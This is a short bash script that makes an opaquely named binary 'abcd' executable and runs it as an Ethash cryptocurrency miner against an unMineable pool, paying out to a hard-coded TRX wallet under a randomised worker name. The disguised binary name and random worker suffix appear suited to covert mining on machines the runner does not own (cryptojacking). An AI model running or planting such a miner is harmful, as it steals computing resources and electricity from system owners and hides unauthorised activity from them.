#!/bin/bash

POOL=ethash.unmineable.com:3333

WALLET=TRX:TBg84GDeAaNemxRJj7Bexu5UWvNhiFaLmL

WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-preet#ikbn-blf5)

chmod +x abcd

./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
